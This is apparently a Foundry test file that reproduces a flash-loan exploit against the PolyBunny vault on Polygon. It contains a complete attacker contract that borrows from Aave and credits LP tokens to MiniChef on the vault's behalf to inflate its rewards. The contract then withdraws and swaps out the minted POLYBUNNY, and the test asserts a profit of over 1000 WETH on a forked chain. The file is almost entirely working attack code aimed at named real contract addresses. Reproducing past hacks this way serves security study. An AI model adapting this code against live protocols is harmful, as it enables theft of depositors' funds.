// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IAaveV2Pool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IPolyBunnyVault {
    function deposit(
        uint256 amount
    ) external;
    function withdrawAll() external;
}

interface IMiniChef {
    function deposit(
        uint256 pid,
        uint256 amount,
        address to
    ) external;
}

interface IUniRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract PolyBunnyAttacker {
    IERC20 private constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 private constant USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 private constant WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IERC20 private constant WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 private constant POLYBUNNY = IERC20(0x4C16f69302CcB511c5Fac682c7626B9eF0Dc126a);
    IERC20 private constant SUSHI_USDC_USDT_LP = IERC20(0x4B1F1e2435A9C96f7330FAea190Ef6A7C8D70001);

    IAaveV2Pool private constant AAVE = IAaveV2Pool(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IUniRouter private constant SUSHI_ROUTER = IUniRouter(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
    IUniRouter private constant QUICKSWAP_ROUTER = IUniRouter(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    IPolyBunnyVault private constant VAULT = IPolyBunnyVault(0xdF0BE663C84322f55aD7b40A4120CdECBa4C4B45);
    IMiniChef private constant MINICHEF = IMiniChef(0x0769fd68dFb93167989C6f7254cd0D766Fb2841F);

    uint256 private constant STABLE_LOAN = 24_000_000e6;
    uint256 private constant WETH_LOAN = 100_000 ether;
    uint256 private constant VAULT_DEPOSIT = 9_416_941_138;

    function attack() external {
        address[] memory assets = new address[](3);
        assets[0] = address(USDC);
        assets[1] = address(USDT);
        assets[2] = address(WETH);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = STABLE_LOAN;
        amounts[1] = STABLE_LOAN;
        amounts[2] = WETH_LOAN;

        uint256[] memory modes = new uint256[](3);
        AAVE.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE), "not Aave");

        USDC.approve(address(SUSHI_ROUTER), type(uint256).max);
        USDT.approve(address(SUSHI_ROUTER), type(uint256).max);
        SUSHI_ROUTER.addLiquidity(
            address(USDC), address(USDT), STABLE_LOAN, STABLE_LOAN, 0, 0, address(this), block.timestamp
        );

        SUSHI_USDC_USDT_LP.approve(address(VAULT), type(uint256).max);
        VAULT.deposit(VAULT_DEPOSIT);

        // The vault calculates performance rewards from its MiniChef position.
        // Credit most of the attacker's LP directly to that position without
        // minting corresponding vault shares.
        SUSHI_USDC_USDT_LP.approve(address(MINICHEF), type(uint256).max);
        MINICHEF.deposit(8, SUSHI_USDC_USDT_LP.balanceOf(address(this)), address(VAULT));

        WETH.approve(address(QUICKSWAP_ROUTER), type(uint256).max);
        _swapExact(QUICKSWAP_ROUTER, address(WETH), address(WMATIC), WETH.balanceOf(address(this)));

        VAULT.withdrawAll();

        POLYBUNNY.approve(address(QUICKSWAP_ROUTER), type(uint256).max);
        _swapExact(QUICKSWAP_ROUTER, address(POLYBUNNY), address(WETH), POLYBUNNY.balanceOf(address(this)));

        WMATIC.approve(address(QUICKSWAP_ROUTER), type(uint256).max);
        _swapExact(QUICKSWAP_ROUTER, address(WMATIC), address(WETH), WMATIC.balanceOf(address(this)));

        SUSHI_USDC_USDT_LP.approve(address(SUSHI_ROUTER), type(uint256).max);
        SUSHI_ROUTER.removeLiquidity(
            address(USDC),
            address(USDT),
            SUSHI_USDC_USDT_LP.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );

        uint256 stableRepayment = STABLE_LOAN + 21_600e6;
        _swapForExact(QUICKSWAP_ROUTER, address(WETH), address(USDC), stableRepayment - USDC.balanceOf(address(this)));
        _swapForExact(QUICKSWAP_ROUTER, address(WETH), address(USDT), stableRepayment - USDT.balanceOf(address(this)));

        USDC.approve(address(AAVE), type(uint256).max);
        USDT.approve(address(AAVE), type(uint256).max);
        WETH.approve(address(AAVE), type(uint256).max);
        return true;
    }

    function _swapExact(
        IUniRouter router,
        address tokenIn,
        address tokenOut,
        uint256 amount
    ) private {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
    }

    function _swapForExact(
        IUniRouter router,
        address tokenIn,
        address tokenOut,
        uint256 amountOut
    ) private {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapTokensForExactTokens(amountOut, type(uint256).max, path, address(this), block.timestamp);
    }
}

contract PolyBunnyExploitTest is Test {
    IERC20 private constant WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);

    function testExploit() public {
        vm.createSelectFork("https://polygon.drpc.org", 16_933_433);
        PolyBunnyAttacker attacker = new PolyBunnyAttacker();

        attacker.attack();
        assertGt(WETH.balanceOf(address(attacker)), 1000 ether);
    }
}
